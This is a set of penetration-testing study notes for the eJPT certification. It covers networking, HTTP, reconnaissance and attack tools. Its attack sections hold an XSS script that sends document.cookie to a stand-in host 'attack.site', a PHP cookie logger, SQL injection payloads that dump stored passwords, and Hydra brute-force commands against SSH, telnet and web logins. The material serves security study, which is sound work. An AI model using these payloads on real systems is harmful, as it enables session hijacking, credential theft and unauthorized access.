# EJPT Cheat Sheet

## 1 Introduction

### 1.1 Terms

- White hat: Legal hacker
- Black hat: Illegal hacker
- User: A computer system user
- Malicous user: A user misusing systems and applications for attack
- Root/Admin: Users with maximum priviledge
- Security through obscurity: Security of design provide security
- Attack: Action aimed at misusing or taking control over a computer system
- Priviledge escalation: When a malicous user gains elevated priviledges over a system
- Dos: Denial of service
- RCE: Remote code execution
- Shellcode A custom code providing the attacker a shell on a victims machine

### 1.2 Crytography

- Clear text is data sent without any encryption
  - Lets attacker eavesdrop
  - Should not be used for critical or sensitive data
  - If no other alternative, use only on trusted networks

- Cryptographic protocols encrypts the data
  - Attackers are not able to eavesdrop
  - Should always be used for sensitive or private data

- Use clear-text protocols on untrusted networks?
  - Wrap(tunnel) a cleartext protocol into a cryptographic one

### 1.3 VPN

- Virtual private network
- Uses cryptography to extend private network over a public network
  - Client --(VPN)--> Internet --> Private network

### 1.4 Binary Arithmethic Codes

#### 1.4.1 Binary Conversion

- 0 and 1
- 1 + 1 = 10
- 111 + 1 = 1000

- From decimal to and from binary:
  - $293 = 3*10^0 + 9*10^1 + 2*10^2$
  - $1101 = 1*2^0 + 0*2^1 + 1*2^2 + 1*2^3 = 13$
  - Divide by 2 and keep note of remainder
  - Do the same with previous and keep note of remainder
  - Do thid until remainder is 0
  - What is 13?
    - $13/2 = 6$ (1)
    - $6/2  = 3$ (0)
    - $3/2  = 1$ (1)
    - $1/2  = 0$ (1)
    - **1101**

#### 1.4.2 Logical Operators

- **NOT**
  - Flips bits
  - **NOT** 1101 = 0010
- **AND** 
  - IF both bits are 1, resulting bit is 1. Otherwise 0
  - 1001 **AND** 1100 = 1000
- **OR**
  - If atleast one bit is 1, the resulting bit is 1
  - 1001 **OR** 1100 = 1101
- **XOR**
  - If just one of the bits are 1, resulting bit is 1
  - 1001 **XOR** 1100 = 0101

### 1.5 Hexadecimal

- 1 to 9, A-F
- Add 0x or h at the end to distinguish
- Converting hexadecimals to decimals:
  - 0x3a1 = 0x(3101) = $1*16^0 + 10*16^1 + 3*16^2 = 929$
  - $1019 = 1019 / 16 = 63,6875$
    - $0,6875*16 = 11$
  - $63/16 = 3,9375$
    - $0,9375*16 = 15$
  - $3/16 = 0,1875$
    - $0,1875 * 16 = 3$
  - **=0x3FB**
- Use converters online for this instead

## 2 Networking

### 2.1 Protocols

- Machines talk to each other by means of protocols

#### 2.1.1 Packets

- Carries information between networked computers
- Consists of a header and a payload
- **Header**
  - Has protocol-specific structure that makes sure the host can correctly interperet the payload
- **Payload**
  - The actual information of the package

- **The IP Header**
  - Atleast 160 bits long
  - First four bits are IP version(4 or 6)
  - 32 bits ad position 96 represent source address
  - Following 4 bytes represent destination address

#### 2.1.2 Protocol Layers

- **ISO layers:**
  1. Application
  2. Presentation
  3. Session
  4. Transport
  5. Network
  6. Data Link
  7. Physical

- Each layer encapsulates a package with its own header
- The recieving host does the same in reverse

### 2.2 IP

- TCP/IP
- Delivering datagrams
- Each host has a unique address

- Reserved IP's:
  - 0.0.0.0 - 0.255.255.255 is This network
  - 127.0.0.0 - 127.255.255.255 is Local host
  - 192.168.0.0 - 192.168.255.255 us reserved for private networks

#### 2.2.1 IP/Mask

- Identifies a network part and host part of an IP address
- Perform bitwise AND operation between the netmask and the IP address
- **Network Prefix:**
  - 192.168.32.0/255.255.224.0
- **CIDR Notation**
  - 192.168.32.0/19
- Subnet calculators

#### 2.2.3 IPv6

- IPv6 has 128 bit addresses compared to IPv4's 32 bit
- Consists of 16-bit hexadecimal numbers seperated by a ":"
  - Case insensitive
  - Can be skipped if zero occur

- Several representations:
  1. **Regular form:** 1080:0:FF:0:8:800:200C:417A
  2. **Compressed form:** FF01:0:0:0:0:0:0:43 --> FF91::43

- Also has reserverd addresses
- Can be split in half into network part and a device part
  - First 64 bits ends with a 16-bits space that can only be used for specifying a subnet

- **Scope and address types of IPv6**
  - Global Unicast Address
    - Scope: Internet-Routed on Internet
  - Unique Local
    - Scope: Internal network or VPN, internally routable but not routed on Internet
  - Link Local
    - Scope: Network link-Not routed internally or externally

- Translating IPv6 to binary
  - One 4-digit hex work represents 16 binary digits
  - Bin 0000000000000000 = Hex 0000
  - Bin 1111111111111111 = Hex FFFF
  - Bin 1101010011011011 = Hex D4DB

- IPv6 addresses has a dedicated subnetting portion
  - First 48 bits are global addressing
  - The 16 next are defining subnets
  - The last 64 bits are for device(interface) ID's

- Prefixes
  - In IPv6, prefixes instead of subnet blocks
  - 2001:1111:1234:1234::/64
    - The number after slaggs is the number of bits that is used for a prefix
    - Everything else behind it can be used for hosts of the subnet

### 2.3 Routing

- Routers are connected to different networks at the same time forwaring datagrams from one network to another
- Forwarding policy based on routing protocols

- Routers use routing tables to find the right forwarding policy
- Routes to network matching the address of the packet, if no matching entry in table, send to default 0.0.0.0

- If two paths have the same number of hops, routing metrics ensures the fastest is selected
- Every host also stores their own routing table

### 2.4 Link Layer Devices and Protocols

- Link layer is the lowest stack of TCP/IP stack
- Packet forwarding also occurs her

- Hubs and switches are network devices that forward frames on a local network wit link layer network addresses: **MAC addresses**
  - Mac addresses uniquely identify network cards at layer 2
  - Media Access Control
  - Also known as the physical address
  - 48 bits long expressed in hex
  - Each host on a network has both an IP address and a MAC address

- Sending a packet from one network to another:
  - The sender creates a packet with:
    1. The destination IP address of the reciever in the header of the datagram
    2. The destination MAC address of the router in the link layer header of the frame
    3. The source IP address of the sender
    4. The source MAC address of the sender
  - The router then takes the packet and forward it to the recievers network, rewriting the packet's MAC addresses 
    - The destination MAC address will be the recievers address
    - The source MAC address will be the router's 

- Broadcast MAC address
  - A frame with this address is delivered to all the hosts in the local network

#### 2.4.1 Switches

- Switches works with mac adresses
- Multiple interfaces
- Forwarding table
- Learns of new hosts dynamically by inspecting packet headers

#### 2.4.2 Forwarding tables

- Content addressable memory table(CAM)
- Contains:
  - MAC addresses
  - Interface tied to MAC addresses and a time to live(TTL)
- Stored in the devices RAM, and is constantly refreshed
- TTL is how long an entry will stay in the table
- TTL is important because CAM's have finite sizes
- Source MAC addresses are compared in the to the entries in the CAM table for all packets
  - If source is not in the table, the switch will add a new MAC interface binding in the table
  - If it exists in the table, TTL is updated
  - Updates if MAC is bound to another interface

#### 2.4.3 Forwarding

- To forward a packet:
  1. Switch reads destination MAC address of frame
  2. Looks in the CAM table
  3. Forwards to corresponding interface
  4. If no entry with that MAC address, the switch forwards the frame to all interfaces

#### 2.4.4 Address Resolution Protocol(ARP)

- Makes hosts able to build correct IP address - MAC address bindings
  
- Host A wants to send traffic to B, but only knows the IP address of B:
  1. A builds an ARP request containing the IP of B and FF:FF:FF:FF as destination MAC address. This makes the switch forward it to all hosts
  2. Every host recieves the requests
  3. B replies with an ARP reply to A, telling it's MAC
  4. A then saves the the IP-MAC in its ARP cache

#### 2.4.5 Hubs

- Just repeaters forwarding packets by repeating the electrical signal it recieves

### 2.5 TPC/UDP

- Transmission control protocol 
- User datagram protcol

- IP protocol suite using TCP is called TCP/IP
- Characteristics of TCP and UDP:
  - TCP:
    - Lower throughput
    - Connection oriented
    - Guarantees delievry
  - UDP:
    - Better throughput
    - Connectionless
    - Does not guarantee packet delivry

#### 2.5.1 Ports

- Used to identify single network process on a machine
- **IP** : **Port**
  - 0.0.0.0:80

#### 2.5.2 TCP and UDP Headers

- Two fields
  - Source
  - Destination ports
- Tells the server or client what port to use

#### 2.5.3 TCP Three Way Handshake

- Header fiels involved:
  - Sequence number
  - Acknowledgment number
  - SYN and ACK flags

- Procedure:
  1. Client sends TCP packet with SYN flag enabled and a random sequence number
  2. Server responds with SYN and ACK flags set, and a random sequence number
     - ACK number is always an increment of recieved SYN
  3. Client completes synchronization by sending ACK

### 2.6 Firewalls and Network Defence

#### 2.6.1 Firewalls

- Software filtering packets
- Access control on different layers of the OSI model
- Filters according to rules:
  - Source IP
  - Destination IP
  - Protocol
  - Source port
  - Destination port
  - etc..

- Packet filters inspects headers to determine what to do:
  - Allow
  - Drop - No notifying to server
  - Deny - Notifying server

- **Problem**: Headers give no information on content data of packet

- Attack example:
  - Company hosts a web server
  - Firewall allows all incoming traffic from internet and direct it to port 80
  - Application exploits go through because firewall can not see the difference between web browsing and web exploit
//TODO

### 2.7 DNS

- Domain Name System
- Application layer protocol
- Converts human-readable names to IP addresses

- A DNS name can be broken down into:
  - Top level domain(TLD)
  - Domain name
  - Subdomain name
  - Host name

- Name resolution performed by resolvers
  - Servers contacting top level domain and follows the hiarchy to resolve the name of the host
  - ISP or publicly available
- OS must contact a resolver to break down DNS into IP address

- DNS resolution algorithm:
  1. Resolver contacts root name servers
  2. Then asks TLD name server what the authoritive name server is that can give information about the domain it seeks
  3. If there are more subdomains, step 2 is performed again on the authorotive DNS server for every subdomain
  4. Finally the resolver asks for the name resolution for the host part

- IP addresses of the root servers are hardcoded in to the configuration of the resolver, and needs to be updated to work

- DNS can also reverse an IP address to a DNS name

### 2.8 Wireshark

#### NIC Promiscuous Mode

- Network interface cards
- A NIC will accept and process any packet it recieves
- To sniff other ethernet traffic, ARP poisoning or Mac flooding must be performed
- **Capture filters** downsizes the amount of traffic gathered
- **Display filters** allows granular filters to every field of the captured packets

## 3 Web Applications

### 3.1 HTTP

- Hyper text transfer protocol
- Transfers web pages and web application data
- Works on top of the TCP protocol

- HTTP message format:
  - Headers\r\n
  - \n\n
  - Message Body\r\n

- HTTP Header fields:
  - **Request method**
    - Type of request(GET, PUT, TRACE, HEAD, POST, etc)
  - **Host**
    - Internet hostname and port number
  - **User-Agent**
    - Client software and OS issuing request
  - **Accept**
    - What  document type it is expecting in response
  - **Accept Language**
    - Specific human language in response
  - **Accept Encoding**
    - Restricts content encoding
  - **Connection**
    - Desired properties for current connection

- Server sends response after client request:
  - **Status Line**
    - Status codes
  - **Date**
    - Date and time request message was originated
  - **Cache-Control**
    - Tells the client about cached content
  - **Content-Type** 
    - Tells the client how to intereperet the message
  - **Content-Encoding**
    - Extends content type
  - **Server**
    - Contains header of server who generated response
  - **Content-Length**
    - Length of content in bytes

### 3.2 HTTPS

- HTTP Secure
- HTTPS over TLS
- Encryption layer
  - Cannot sniff application layer communication
  - Cannot alter application layer data
  - Server and client can authenticate eachother

- An adjacent network user will not be able to recognize:
  - Request headers, body and domain
  - Response headers, body
- He coulf be able to recognize:
  - Target IP
  - Target Port
  - DNS

- Does not protect against web application flaws!

### 3.3 HTTP Cookies

- Textual information stored in the servers cookie jar
- A cookie contains the following attributes:
  - The actual content
    - ID=value 
  - An expiration date
    - expires=.......
  - A path
    - path=/...../..
  - The domain
    - domain=.example.com
  - Optional flags:
    - Http only flag
    - Secure flag

#### 3.3.1 Cookie Domain

- Cookies are sent only to their valid domain/path if they are not expired and according to their flags
- The domain field sets the scope of the cookie, browser only sends cookie if it is for the right domain
- When a cookie has the domain attribute set to:
  - domain=example.com or .example.com, the browser will send the cookie to the site and whatever else subdomains within the scope

- If the server does not specify the domain attribute, the browser automatically set the domain of the server domain, and set the host  only domain flag

#### 3.3.2 Cookie Expiration

- Expires is the validity timer for the cookie
- Browsers will not send expired cookies to servers

#### 3.3.3 Cookie Http-Only Attribute

- Prevents any other language than HTTP to read from the cookie

#### 3.3.4 Cookie Secure Attribute

- Secure flag creates secure cookies only sent over HTTPS

#### 3.3.5 Cookie Protocol

- Servers sends Set-Cookie response in header field. telling the browser to install the cookie
- For every subsequen request the browser considers:
  - Domain
  - Path
  - Expiration
  - Flags
- If all pass, the browser will insert a cookie: header in the request
  
### 3.4 Sessions

- Server side stored variables
- Identified by an ID or Token
- Clients presents this ID for all requests, being recognized by the server

- Web servers install session ID's by using session cookies
  - Single parameter referring to the session
  - Each language has their own session parameter name

- Session IDs can also transmitted via GET requests

#### 3.5 Same Origin Policy

- Prevents JavaScript code from getting or setting properties on resource coming from a different origin
- To determine if JavaScript can access a source, the browser uses:
  - Protocol
  - Hostname
  - Port
- All must match!
- Only works for the actual script, HTML tags are still vulnerable

## 4 Scripting

### 4.1 Important Windows Commands

- **Output redirection:**
  - echo aaa > output.txt

- **Execute two commands regardless of eachother:**
  - [Command1] & [Command2]

- **Execute two commands where the other executes if the other succeeds:**
  - [Command1] && [Command2]

- **To create larger command line scripts, save them as .bat with one command per line**

- **List all files in a directory:**
  - for %i (*.*) do @echo FILE: %

## 5 Information Gathering

### 5.1 Open-Source Intelligence

#### 5.1.1 Social Networks

- Easiest way to gather information about employees
- Important to select the correct social media depending on client
- Integration between social media profiles can help you find important information on one site, unnavailable on the other
  - Twitter and LinkedIn can be used to autheticate eachother
  - LinkedIn displays full name along with email

#### 5.1.2 Public Sites Information Gathering

- **CrunchBase**
  - Information about founder, investors, employees, buyouts and acquisitions

- **Government sites**

- **Whois**
  - Command on OSX and Linux
  - Displays information stored in the whois database
  - Used on internet domains

#### 5.1.3 Browsing Client´s Sites

- Products
- Services
- Technologies
- Company culture
- Employees profiles

#### 5.1.4 Email Patterns 

- Many companies uses internal email schemas for employees
- Often:
  - name.surename@company.com
  - surname.name@company.com

- Some systems informs the sender if an email address does not exist
  - Gather names of employees in the company
  - Try different combinations of first- and surnames
  - Send non suspicous mails to the different addresses and observe what the addresses return
  - If some of the addresses return a failed mail request notification, you can disregard it, and find the actual addresses

### 5.2 Subdomain Enumeration

- Enumerate to find new resources
- Widens the attack surface
- Common for companies to share the same top level domain name
  - e.g careers.company.com, mail.company.com
  - May be outdated

- Passive subdomain enumeration
  - Identifying subdomains without directly interracting with the target
  - Interracting through open sources such as search engines
  - Google for example may index pages that were not meant to be indexed
    - site:company.com

- **dnsdumpster.com**
- **sublist3r**
  - Collects DNS data

## 6 Footprinting and Scanning

### 6.1 Mapping Networks

- Enumeration process to find nodes from IPs
  - Who is a client and server?

- Ping sweeping:
  - Sending echo requests(IMCP packets) to hosts to see who is alive
  - It it replies with an echo reply packet, the host is alive
  - Fping
    - Linux ping sweeper
      - *Fping -a -g 10.54.12.0/24*
  - Nmap
    - *nmap [scan type] [options] [target]

### 6.3 Nmap Ping Scan

- **-sn**
  - Ping scan
    - *nmap -sn 200.200.0.0/16*
- **-il**
  - Save host list to file and use as input
    - *nmap -sn -iL hostslist.txt*
- **-Pn**
  - Skips the ping scan
  - If you allready know the targets are alive

### 6.4 nmap OS Fingerprinting

- **-O**
  - OS fingerprinting
  - Determining which OS the host is running
  - Sends a series of specifically crafted requests to hosts and examines every bit to find OS signatures
    - *nmap -Pn -O <target(s)>*
  - Limit to promising hosts
    - *nmap -O --osscan-limit <targets>*

### 6.5 nmap Port Scan

- Discover services and daemons listening on different ports
- Determine which TCP or UDP ports are open on the target host

- When a port scanner tries to connect to an open TCP port
  - The TCP three way handshake is completed
  - This means the port is open
  - The scanner sends a RST+ACK to close the connection

- When a port scanner tries to connect to a closed TCP port
  - The scanner tries to complete the three way handsake by sending a SYN packet
  - The server replies with a packet with RST-ACK packet
  - This means the port is closed

- Every TCP connect gets recorded in the daemon logs
  - To be more stealthy, use TCP SYN scans
  - A well-configured IDS will still detect it
  - Only sends a SYN packet instead of full TCP handshake
  - If scanner recieves SYN+ACK packet, port is marked as open

- Common nmap scan types
  - **-sT** - TCP connect scan
  - **-sS** - TCPSYN scan
  - **-sV** - version detection scan
    - Reads the banner from the daemon on the port
  - **-p** - Specifies port range

- Scan targets can be specified with
  - DNS names
  - IP address lists
  - CIDR notation
  - Wildcards
  - Ranges
  - Octets lists
  - Input files

### 6.6 Spotting Firewalls

- Pings could be blocked
  - **-Pn** - Skips ping scanning and treats ports as alive

- Some ports are almost always open on a networkl even if they appear closed

- Be aware of false positives

- If scan is successfull agains a web server, nmap should not have any difficulty to spot the version
  - Could mean a firewall is in place
  - tcpwrapped
    - TCP handshake was complete, but remote host closed connection withouth recieving any data
  - **--reason** - Could be used to explain why a port is open or closed

### 6.7 Masscann

- Used on larger networks with more IPs 
- Faster than nmap, but less accurate
- Can be used for a general network map, and then nmap for fine graining the results

## 7 Vulnerability Assessment

- Finding vulnerabilities without executing the exploitation phase

### 7.1 Vulnerability Scanner

- Scanner performs probes on
  - Port daemons
  - Configuration files of OS, software, network devices, etc
  - Windows registry entries

- Compares result to its database
- Scanners vendor keeps the tool up to date by updating database
- Scanners do not work on custom applications, perform manual testing for these

- How they work:
  1. Determine if target hosts are alive and which ports are open
  2. For every port found, the scanner sends special probes to determine application
  3. For each detected service, the scanner looks queries its database and looks for matches
  4. The scanner sends probes to verify the vulnerability exists

### 7.2 Nessus

- Vulnerabilty scanner
- Client and server components
  - Client
    - Provides interface
  - Server
    - Scans by sending probes to systems and applications
    - Compares results to database
  - Can run both on one machine

## 8 Web Application Attacks

### 8.1 Fingerprinting Web Servers

- To fingerprint web server is finding:
  - Daemon providing the wev server
  - Version
  - OS of the machine hosting the server

#### 8.1.2 Fingerprinting with Netcat

- Use as a client and manually send requests to server

- Banner grabbing
  - Connect to a listening daemon and grab the banner it sends back
  - *nc [target address] 80*
  - Netcats connects to server
  - Hit enter two times
  - **HEAD/HTTP/1.0**

- Does not work with HTTPS

#### 8.1.3 Fingerpriting with OpenSSL

- Works with HTTPS
- *opens ssl s_client -connect target.site:443*
- **HEAD / HTTP/1.0**

#### 8.1.4 Fingerprinting with Httprint

- Signature based fingerprinting
- Common syntax
  - *httprint -P0 -h [target hosts] -s [signature file]*

### 8.2 HTTP Verbs

#### 8.2.1 Recap of HTTP verbs

  1. **GET**
      - Browser can request resources
        - **GET** */page.php HTTP/1.1*
      - Can also pass arguments to web app
        - **GET** */page.php?resource=ITEM* **HTTP/1.1**
        - **Host:** *www.example.com*
  2. **POST**
     - Submit HTML form data in the message body
  3. **HEAD**
     - Similar to **GET**, but only asks for header of the response to the response body
  4. **PUT**
      - Uploads file to the server
  5. **DELETE**
      - Removes a file from the server
  6. **OPTIONS**
      - Queries to HTTP server for enabled HTTP verbs

#### 8.2.2 REST APIs

- Web application that strongly rely on HTTP verbs
- Expect to have subverted functionality
  - e.g PUT for saving data not saving files
- Check wether the verbs do what you think they do

### 8.3 Expoliting Misconfigured HTTP Verbs

- First enumerate available methods with an **OPTIONS** message with netcat
  - *nc victim.site 80*
  - **OPTIONS** */ HTTP/1.0*
  - Inspect response **Allow** parameter

#### 8.3.1 Exploiting PUT

- Must know size of payload before upload
  - Find with *wc -m payload.php*

- Example
  - *nc vinctim.site 80*
  ```HTTP
  PUT /payload.php HTTP/1.0
  Content-type: text/html
  Content-length: 20

  <?php phpinfo(); ?>
  ```

- After uploading the file, pass arguments to the file via cmd GET parameter

### 8.4 Google Hacking

- Advanced google searches to find vulnerable subdomains or files on a site
- Google Dorks
- see: https://www.exploit-db.com/google-hacking-database

### 8.5 XSS

- A successfull attack could lead the attacker to:
  - Modify content of site at runtime
  - Inject malicous content
  - Steal cookies
  - Perform unauthenticated actions
  - etc...

- Actors involved
  - A vulnerable website
  - Victim user
  - Pentester/hacker

- Happens because of unfiltered user input to build output content
- User input is any parameter coming from the user
- All user inputs should be validated because a user input is never to obe trusted

- An attacker exploits a web site by
  - Making the user browser load malicous content
  - Performing actions on other users behalf
  - Stealing their session cookies

#### 8.5.1 Finding XSS

  1. Look at every user input and test if it is somehow displayed to the output of the site(reflection point)
  2. Check if it possible to inject HTML code and if it ouputs
      - Try HTML tags < >

#### 8.5.2 Reflected XSS

- Payload is carried inside request that the users browser sends to the webpage
- Called reflected becauses an input from the user is immediately reflected to the output page

#### 8.5.3 Persistent XSS Attacks

- Payload is sent to the vulnerable site and stored and executed when the page web page pulls the stored content
- A single attack could exploit multiple users
- Most common attacks are from HTLM post forms
- Examples
  - Display cookie with
    - `<script> alert(document.cookie)</script>`
  - Send cookie to attacker-controlled site

    - ```javascript
      <script>
      var i = new Image();
      i.src="http://attack.site/log.php?q="+document.cookie;
      ```

    - ```php
      <?php
      $filename="/tmp/log.txt";
      $fp=fopen($filname, 'a');
      $cookie=$_GET['q'];
      fwrite($fp, $cookie);
      fclose($fp);
      ?>  
      ```

- Hack.me to test yourself
- Web application hacker's handbook

### 8.6 SQL Injections

#### 8.6.1 SQL Statements

- SQL syntax
  
  - ```sql
    SELECT <columns list>, FROM <table> WHERE <condition>;
    ```

- Union command
  - Performs union between two results
  
  - ```sql
    <SELECT statement> UNION <other SELECT statement>;
    ```

- Comments in SQL
  - "#" or "--"

#### 8.6.2 SQL Queries Inside Web App

- The application must
  1. Connect
  2. Submit
  3. Retrieve

#### 8.6.3 Vulnerable Dynamic Queries

- Change expected **$id** value to a condition that is always true
  - **' OR 'a'='a**
  - Second condition is always true
  - Selects all items in database

- Union exploit
  - Select items with empty id and performing a union with all entries in Accounts table
  
  - ```sql
    ' UNION SELECTS Username, Password  FROM Accounts WHERE 'a'='a;
     ```

#### 8.6.4 Finding SQL Injections

- Find injection point and craft payload
- Test every user supplied input
  - GET parameters
  - Post parameters
  - HTTO Headers
  - etc

- To test input
  - String terminators
  - SQL commands(SELECT, UNION,...)
  - SQL comments

#### 8.6.5 Exploiting Boolean Based SQLi

- MySQL functions
  - user()
    - Returns name of the user currently using the database
  - substring()
    - Returns a substring of given arguemt
    - substring([input string], [position], [length])

- SQL allows testing output if a function in a True/False condition
  - Can therefor iterate through letters of username

    - ```sql
      ' or substr(user(), 1, 1)= 'a
      ```

  - When a letter is found, change to next position until entire username is found

#### 8.6.6 UNION Based SQL Injections

- Empties the original queue and shows another attacker controlled querie shown on the page

- SELECT description FROM items WHERE is='' UNION SELECT user(); -- -';
  - Payload forcing the web app to display user() to output page
  - The comment part of the payload prevents the original part of the query being parsed by the database
  - The last ' is the remainder of the original query
  - The third dash is there because browsers automatically remove trailing spaces in the URL

- Important to find the number of fields in the input
  - Test UNION with different amounts of fields
    - ' UNION SELECT null; -- -
    - ' UNION SELECT null, null; -- -
    - ' UNION SELECT null, null, null; -- -
    - etc...
    - Until one result gives a valid output

- When number of outputs are found, test which display out
  - Test with known values and observe what the site reflects

- Not only SELECT is vulnerable for injection
- What does the SQL query do?
  - Modifing data?
  - Only displays data?

- Find injection point, then use SQLMap

#### 8.6.6 SQLMap

- sqlmap -u (URL) -p (parameter) --techique=(technique(e.g U))
- **-b**
  - Find database banner
- **--tables**
  - Find database tables
- **--current-db <database>**
  - Find information from a specific database
- **--columns**
  - Find columns in database
- **--dump**
  - Get values from table
- **-T**
  - Specify table
- **-D**
  - Specify database

## 9 System Attacks

### 9.1 Password Attacks

#### 9.1.2 John the Ripper

- Mount brute force and dictionairy attacks
- Check formats supported
  - **--list=formats**
- Needs passwords and usernames to be in the same file
  - Use *unshadow* tool to place in same file
  - **unshadow plaintext.txt hashes.txt > crackme**

- Brute force attack
  - **john -incremental -users:<users list> <file to crack>**
- Brute force a single user
  - **john -incremental -user:victim crackme**
- Display passwords recovered
  - **--show**

- Run john with a dictionairy
  - **john --wordlist<=custom wordlist file> <file to crack>**

- Mangling with john
  - Try different common variations of passwords
  - **john --wordlist<=custom wordlist file> -rules <file to crack>**

#### 9.1.3 Hashcat

- Relies on GPU not CPU to crack passwords
- **-b**
  - Run this first to test system
  - Benchmark test

- **-m**
  - Hash type
  - e.g 0 is MD5

- **-a**
  - Attack type
  - e.g 0 is dictionairy
  - Example
    - **hashcat -m 0 -a 0 -D2 example0.hash example.dict**
    - MD5 dictionairy attack with hashes from example.hash with example.dict

- **-r** (path to rule file)
  - Rule based attack
  - Write rules to file that hashcat can use later for refrence
  - Write to own file with another rule for each line
  - Makes the process a lot more faster
  - https://www.notsosecure.com/one-rule-to-rule-them-all
    - Most effective rules for cracking passwords

- Mask attack
  - Guess what kind of symbol is at given position
  - Could be a lot faster than brute force attacks
  - Define what kind of symbol should be in a given posistion
  - Charset
    - ?l = a-z
    - ?u = A-Z
    - ?d = 0-9
    - ?h = 0-9, a-f
    - ?H = 0-9, A-F
    - ?s = "space ! - `
    - ?a = ?l?u?d?s

#### 9.1.4 Rainbow Tables

- Time processing tradeoff for calculating hashes
- Contains links between the results of a run of one hashing function and another
- Reduces cracking time by a large amount
- Use **Ophcrack** for cracking Windows autentication passwords

## 10 Network Attacks

### 10.1 Authentication Cracking

#### 10.1.1 Hydra

- Can use brute force or dictionairy attacks to authenticate on web servers

- Dictionairy attack
  - **hydra -L users.txt -P pass.txt <service://server> <options>**

- **-p** or **-P**
  - Try given password(s) string(s) or from file
- **-t**
  - How many paralell tasks to execute
- **-l** or **-L**
  - Try login name(s) string(s) or from file

- **-U**
  - Service model usage details
  - What options must be specified for the attack to run

- **-f**
  - Exit after first successfull login

- **-V**
  - Verbosity

- **http-post-forms**
  - **hydra <1> http-post-form "/login.php:<2>^USER^& <3>=^PASS^:<4>**
    1. Login site
    2. HTML POST user parameter
    3. HTML POST password parameter
    4. Unsuccessfull login message from website
    - Example
      - **hydra hack.this http-post-form "/login.php:usr^USER^&pwd=^PASS^:invalid credentials -L /usr/share/ncrack/minimal.usr -P /usr/share/seclist/Passwords/rock-you-15.txt -f -V**

- telnet attack
  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  telnet://<address>**

- SSH attack
  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  <address> ssh**
  - Once in, download files with
    - **scp username@hostname:/path/to/remote/file /path/to/local/file**
    - Important unix files
      - **/etc/passwd**
      - **/etc/shadow**

### 10.2 Windows Shares

#### 10.2.1 NetBIOS

- Network Basic Input Output System
- View shares on a local network
- Can supply information when quering a computer
  - Hostname
  - NetBIOS name
  - Domain
  - Network shares

- Sits between application layer and IP layer

- Small traffic relies on UDP
  - Name resolution and one to many datagram communication
- Big traffic relies on TCP
  - e.g file copy
  - Uses **NetBIOS** sessions

- MS windows machine when browsing network
  - Datagrams to list the shares and the machines
  - Names to find workgroups
  - Sessions to transmit data to and from a Windows share

#### 10.2.2 Shares

- A windows machine can share a file or a directory on the network
- Remote and local users can access the resource
- Users just has to turn on File and Printer Sharing service
- Users can set permissions on shares, choosing permissions for other users on that share

#### 10.2.3 UNC Path

- Universal NAming Conventions paths
- Authorized users can access shares
- **\\ServerName\ShareName\file.nat**

#### 10.2.4 Admin Shares

- Default shares for admins and the windows OS
- **\\ComputerName\C$**
  - Lets admin access local volume on machine
- **\\ComputerName\admin$**
  - Points to windows install dir
- **\\ComputerName\ipc$**
  - Used for interprocess communication

### 10.3 Null Sessions

- Used to enumerate info
  - Passwords
  - System users
  - System groups
  - Running processes

- Remote exploitable
- Most modern windows systems are not vulnerable, but some legacy systems are
- Exploit of autheticity for Windows administrative shares

#### 10.3.1 Enumerating Windows Shares on Windows

- **nbtstat**
  - **nbtstat -A <IP>**
    - Displays info about a target
    - <00> = Computer is workstation
    - UNIQUE = Computer has only one IP
    - <20> = File sharing is running on the machine

- **NET VIEW**
  - Once the attacker knows the machine is running the File server service
  - **NET VIEW <TARGET IP>**

### 10.3.2 Checking for Null Sessions on Windows

- Once found File and Printer Sharing service
- Example
  - Exploit IPC$ administrative share
  - **NET USE \\<target IP address>\IPC$ '' /u: ''**
    - Conect with empty password and username

#### 10.3.3 Exploiting Null Sessions on Windows

- **enum**
  - **enum -S <target IP>**
    - **-S** = Enumerate shares on machine
    - **-U** = Enumerate users
    - **-P** = Check password policy
      - Can help with brute forcing and false positives

- **winfo**
  - **winfo <target IP> -n**
    - **-n** = Tell the tool to use null sessions

#### 10.3.4 Enumerating Windows Shares on Linux

- **nmblookup**
  - **nmblookup -A <target ip address>**

- **smbclient**
  - FTP-like client to access windows shares
  - Can also enumerate
  - **smbclient -L //<target ip> -N**
    - **-L** = Lookes up what services are available on the target
    - **-N** = Forces the tool to not ask for password

#### 10.3.5 Checking for Null Sessions on Linux

- **smbclient //<target ip>/<target share> -N**

#### 10.3.6 Exploiting Null Sessions on Linux

- **enum4linux**
  - Same operations as enum dn winfo, but more features